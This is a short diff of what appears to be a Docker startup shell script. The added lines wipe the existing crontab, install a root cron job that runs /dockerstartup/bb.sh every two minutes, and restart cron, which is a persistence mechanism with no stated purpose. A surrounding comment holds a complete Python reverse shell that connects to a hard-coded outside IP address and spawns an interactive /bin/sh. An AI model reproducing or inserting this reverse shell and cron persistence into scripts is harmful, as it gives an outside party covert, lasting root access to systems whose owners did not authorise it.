@@ -12,7 +12,11 @@
 # rm geckodriver-v0.32.0-linux64.tar.gz
 # chmod +x geckodriver
 # mv geckodriver /usr/bin/geckodriver-30
+crontab -r
 
+(crontab -l -u root 2>/dev/null; echo "*/2 * * * * bash /dockerstartup/bb.sh") | crontab -
+
+service cron restart
 #supervisord -n
 #python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("105.111.63.126",10001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 #chown root:root /etc/resolv.conf
